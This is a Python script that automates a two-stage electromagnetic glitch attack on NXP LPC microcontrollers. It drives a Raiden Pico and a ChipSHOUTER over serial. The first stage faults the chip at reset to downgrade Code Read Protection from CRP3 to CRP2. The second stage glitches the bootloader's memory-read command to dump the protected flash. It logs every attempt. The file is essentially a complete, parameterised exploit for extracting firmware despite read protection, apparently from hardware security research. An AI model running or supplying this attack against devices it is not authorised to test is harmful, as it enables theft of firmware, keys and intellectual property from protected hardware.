#!/usr/bin/env python3
"""
CRP3 Full Bypass: Two-stage glitch attack

Stage 1: CRP3→CRP2 downgrade using GPIO RESET trigger
Stage 2: Memory read bypass using UART trigger on read command

This script automatically performs both stages:
1. Glitches during boot to downgrade CRP3→CRP2 (enables bootloader)
2. Once bootloader is accessible, switches to UART trigger
3. Glitches the memory read command to bypass CRP2 protection
4. Success = full memory dump despite CRP protection
"""

import serial
import time
import csv
from datetime import datetime
import sys

SERIAL_PORT = '/dev/ttyACM0'
BAUD_RATE = 115200
TIMEOUT = 2.0

def send_command(ser, cmd, wait_time=0.2):
    """Send command to Raiden Pico"""
    if ser.in_waiting > 0:
        ser.read(ser.in_waiting)
    ser.write(f"{cmd}\r\n".encode())
    time.sleep(wait_time)
    response = ""
    if ser.in_waiting > 0:
        response = ser.read(ser.in_waiting).decode('utf-8', errors='ignore')
    return response

def wait_for_response(ser, expected_text, timeout=5.0):
    """Wait for specific text in serial response"""
    start_time = time.time()
    full_response = ""
    while time.time() - start_time < timeout:
        if ser.in_waiting > 0:
            chunk = ser.read(ser.in_waiting).decode('utf-8', errors='ignore')
            full_response += chunk
            if expected_text in full_response:
                return True, full_response
        time.sleep(0.01)
    return False, full_response

def setup_gpio_trigger(ser, voltage, pause_gpio, width_gpio):
    """Configure GPIO trigger for CRP3→CRP2 downgrade"""
    print("  Configuring GPIO trigger (CRP3→CRP2)...")
    send_command(ser, f"CS VOLTAGE {voltage}", wait_time=0.5)
    send_command(ser, f"SET PAUSE {pause_gpio}", wait_time=0.2)
    send_command(ser, f"SET WIDTH {width_gpio}", wait_time=0.2)
    send_command(ser, f"SET COUNT 1", wait_time=0.2)
    send_command(ser, "TRIGGER GPIO RISING", wait_time=0.2)

def setup_uart_trigger(ser, voltage, pause_uart, width_uart, trigger_byte):
    """Configure UART trigger for memory read bypass"""
    print(f"  Configuring UART trigger (memory read bypass, byte=0x{trigger_byte:02x})...")
    send_command(ser, f"CS VOLTAGE {voltage}", wait_time=0.5)
    send_command(ser, f"SET PAUSE {pause_uart}", wait_time=0.2)
    send_command(ser, f"SET WIDTH {width_uart}", wait_time=0.2)
    send_command(ser, f"SET COUNT 1", wait_time=0.2)
    send_command(ser, f"TRIGGER UART {trigger_byte:02x}", wait_time=0.2)

def stage1_crp3_to_crp2(ser):
    """
    Stage 1: Downgrade CRP3→CRP2 using GPIO RESET trigger

    Returns:
        bool: True if successful (bootloader now accessible)
    """
    # Arm GPIO trigger
    send_command(ser, "ARM ON", wait_time=0.2)

    # TARGET SYNC internally resets target (triggers GPIO glitch) and attempts bootloader SYNC
    ser.write(b"TARGET SYNC 115200 12000 10\r\n")
    success, response = wait_for_response(ser, "LPC ISP sync complete", timeout=15.0)

    return success

def stage2_memory_read_bypass(ser):
    """
    Stage 2: Bypass CRP2 memory read protection using UART trigger

    Returns:
        tuple: (success, result_data)
        success: "SUCCESS" if memory read worked despite CRP2
                 "ERROR19" if still protected (error 19 = command not allowed)
                 "NO_RESPONSE" if target crashed
                 "GARBAGE" if got unexpected response
    """
    # Arm UART trigger before sending read command
    send_command(ser, "ARM ON", wait_time=0.2)

    # Send memory read command
    # This will trigger the UART glitch when the trigger byte is sent
    ser.write(b'TARGET SEND "R 0 516096"\r\n')

    # Wait for response
    response = ""
    start_time = time.time()
    max_wait = 5.0

    while time.time() - start_time < max_wait:
        time.sleep(0.1)
        if ser.in_waiting > 0:
            chunk = ser.read(ser.in_waiting).decode('utf-8', errors='ignore')
            response += chunk
            # Stop if we see the prompt
            if "> " in chunk:
                break

    # Parse result - LPC ISP returns: command echo, return code, data (if success), checksum
    # Example success: "R 0 32\r0\r\n<uuencoded data>\r\n<checksum>\r\n"
    # Example error:   "R 0 32\r19\r\n"

    lines = response.replace('\r\n', '\n').replace('\r', '\n').split('\n')

    # Find the return code line (first line that is just a number after command echo)
    return_code = None
    data_lines = []
    found_echo = False

    for i, line in enumerate(lines):
        line = line.strip()

        # Skip empty lines and prompts
        if not line or line == '>' or line.startswith('TARGET SEND'):
            continue

        # Look for command echo (starts with "R ")
        if line.startswith('R ') and not found_echo:
            found_echo = True
            continue

        # After echo, first number is the return code
        if found_echo and return_code is None:
            if line == '0':
                return_code = 0
            elif line == '19':
                return_code = 19
            elif line.isdigit():
                return_code = int(line)
            continue

        # After return code, collect data lines (UUEncoded or checksum)
        if return_code == 0 and line and not line == '>':
            data_lines.append(line)

    if return_code == 0:
        # Success! Got data
        return "SUCCESS", "\n".join(data_lines)
    elif return_code == 19:
        # Error 19 = command not allowed (CRP protection active)
        return "ERROR19", ""
    elif return_code is not None:
        # Some other error code
        return "GARBAGE", f"Error code: {return_code}"
    elif "No response data" in response or not response.strip():
        return "NO_RESPONSE", ""
    else:
        # Got something but couldn't parse it
        return "GARBAGE", response[:200]

def main():
    if len(sys.argv) < 8:
        print("Usage: python3 crp3_full_bypass.py <voltage> <pause_gpio> <width_gpio> <pause_uart> <width_uart> <trigger_byte> <max_attempts>")
        print()
        print("Example: python3 crp3_full_bypass.py 290 0 150 0 150 0d 1000")
        print()
        print("Parameters:")
        print("  voltage       - ChipSHOUTER voltage (e.g., 290)")
        print("  pause_gpio    - Stage 1 (GPIO) pause cycles (e.g., 0)")
        print("  width_gpio    - Stage 1 (GPIO) width cycles (e.g., 150)")
        print("  pause_uart    - Stage 2 (UART) pause cycles (e.g., 0)")
        print("  width_uart    - Stage 2 (UART) width cycles (e.g., 150)")
        print("  trigger_byte  - UART trigger byte in hex (e.g., 0d for carriage return)")
        print("  max_attempts  - Maximum Stage 1 attempts before giving up (e.g., 1000)")
        sys.exit(1)

    voltage = int(sys.argv[1])
    pause_gpio = int(sys.argv[2])
    width_gpio = int(sys.argv[3])
    pause_uart = int(sys.argv[4])
    width_uart = int(sys.argv[5])
    trigger_byte = int(sys.argv[6], 16)
    max_attempts = int(sys.argv[7])

    print("=" * 70)
    print("CRP3 FULL BYPASS - TWO-STAGE GLITCH ATTACK")
    print("=" * 70)
    print(f"Stage 1 (CRP3→CRP2): GPIO RESET trigger")
    print(f"  Voltage: {voltage}V, Pause: {pause_gpio}, Width: {width_gpio}")
    print(f"Stage 2 (Memory Read): UART trigger on 0x{trigger_byte:02x}")
    print(f"  Voltage: {voltage}V, Pause: {pause_uart}, Width: {width_uart}")
    print(f"Max Stage 1 attempts: {max_attempts}")
    print("=" * 70)
    print()

    # Create CSV log
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    csv_file = f"crp3_full_bypass_{timestamp}.csv"

    # Connect
    print(f"Connecting to {SERIAL_PORT}...")
    ser = serial.Serial(SERIAL_PORT, BAUD_RATE, timeout=TIMEOUT)
    time.sleep(0.5)

    try:
        # Initial setup
        print("Initial setup...")
        send_command(ser, "TARGET LPC", wait_time=0.2)
        send_command(ser, "CS TRIGGER HARDWARE HIGH", wait_time=0.5)
        send_command(ser, "CS ARM", wait_time=1.0)

        stage1_attempts = 0
        stage1_success = False

        with open(csv_file, 'w', newline='', buffering=1) as f:
            writer = csv.writer(f)
            writer.writerow(['timestamp', 'stage', 'attempt', 'result', 'voltage', 'pause', 'width', 'trigger_byte', 'data'])

            # ========== STAGE 1: CRP3→CRP2 DOWNGRADE ==========
            print("\n" + "=" * 70)
            print("STAGE 1: CRP3 → CRP2 DOWNGRADE (GPIO RESET TRIGGER)")
            print("=" * 70)

            setup_gpio_trigger(ser, voltage, pause_gpio, width_gpio)

            while stage1_attempts < max_attempts and not stage1_success:
                stage1_attempts += 1
                test_start = time.time()

                success = stage1_crp3_to_crp2(ser)

                test_elapsed = time.time() - test_start
                ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

                if success:
                    stage1_success = True
                    print(f"\n[{stage1_attempts}/{max_attempts}] ✓✓✓ STAGE 1 SUCCESS! ✓✓✓")
                    print(f"  CRP3→CRP2 downgrade successful!")
                    print(f"  Bootloader now accessible. Moving to Stage 2...")

                    writer.writerow([ts, 'STAGE1', stage1_attempts, 'SUCCESS', voltage, pause_gpio, width_gpio, '', ''])
                    f.flush()
                else:
                    writer.writerow([ts, 'STAGE1', stage1_attempts, 'FAIL', voltage, pause_gpio, width_gpio, '', ''])
                    f.flush()

                    if stage1_attempts % 10 == 0:
                        print(f"  [{stage1_attempts}/{max_attempts}] Stage 1 attempts...")

            if not stage1_success:
                print(f"\n✗ Stage 1 FAILED after {max_attempts} attempts")
                print(f"  Unable to downgrade CRP3→CRP2")
                print(f"  Try different parameters or increase max_attempts")
                return 1

            # ========== STAGE 2: MEMORY READ BYPASS ==========
            print("\n" + "=" * 70)
            print("STAGE 2: MEMORY READ BYPASS (UART TRIGGER)")
            print("=" * 70)

            setup_uart_trigger(ser, voltage, pause_uart, width_uart, trigger_byte)

            stage2_attempts = 0
            max_stage2_attempts = 100  # Try up to 100 times for Stage 2
            stage2_success = False

            while stage2_attempts < max_stage2_attempts and not stage2_success:
                stage2_attempts += 1
                test_start = time.time()

                result, data = stage2_memory_read_bypass(ser)

                test_elapsed = time.time() - test_start
                ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

                writer.writerow([ts, 'STAGE2', stage2_attempts, result, voltage, pause_uart, width_uart, f'{trigger_byte:02x}', data[:100] if data else ''])
                f.flush()

                if result == "SUCCESS":
                    stage2_success = True
                    print(f"\n[{stage2_attempts}] ✓✓✓ STAGE 2 SUCCESS! ✓✓✓")
                    print(f"  Memory read bypass successful!")
                    print(f"  Got memory data despite CRP2 protection:")
                    print(f"  {data[:200]}...")
                elif result == "ERROR19":
                    if stage2_attempts % 10 == 0:
                        print(f"  [{stage2_attempts}] Still protected (error 19)...")
                elif result == "NO_RESPONSE":
                    print(f"\n[{stage2_attempts}] Target crashed, re-syncing...")
                    # Re-sync bootloader
                    ser.write(b"TARGET SYNC 115200 12000 10\r\n")
                    wait_for_response(ser, "LPC ISP sync complete", timeout=15.0)
                    # Reconfigure UART trigger
                    setup_uart_trigger(ser, voltage, pause_uart, width_uart, trigger_byte)
                elif result == "GARBAGE":
                    print(f"\n[{stage2_attempts}] Unexpected response: {data[:80]}")

            # ========== FINAL RESULTS ==========
            print("\n" + "=" * 70)
            print("FINAL RESULTS")
            print("=" * 70)
            print(f"Stage 1 (CRP3→CRP2): {'✓ SUCCESS' if stage1_success else '✗ FAILED'} ({stage1_attempts} attempts)")
            print(f"Stage 2 (Memory Read): {'✓ SUCCESS' if stage2_success else '✗ FAILED'} ({stage2_attempts} attempts)")
            print()

            if stage1_success and stage2_success:
                print("✓✓✓ FULL CRP3 BYPASS SUCCESSFUL! ✓✓✓")
                print(f"Successfully read protected memory from CRP3 device!")
                print(f"Parameters:")
                print(f"  Stage 1: V={voltage} P={pause_gpio} W={width_gpio}")
                print(f"  Stage 2: V={voltage} P={pause_uart} W={width_uart} Trigger=0x{trigger_byte:02x}")
                return_code = 0
            elif stage1_success:
                print("⚠ PARTIAL SUCCESS")
                print(f"  Stage 1 (CRP3→CRP2): Successful")
                print(f"  Stage 2 (Memory Read): Failed after {stage2_attempts} attempts")
                print(f"  Try different Stage 2 parameters (pause, width, trigger_byte)")
                return_code = 2
            else:
                print("✗ ATTACK FAILED")
                print(f"  Stage 1 (CRP3→CRP2): Failed")
                print(f"  Cannot proceed to Stage 2 without bootloader access")
                return_code = 1

            print()
            print(f"Results saved to: {csv_file}")
            print("=" * 70)

            return return_code

    finally:
        ser.close()

if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n\nAttack interrupted by user")
        sys.exit(130)
    except Exception as e:
        print(f"\nError: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
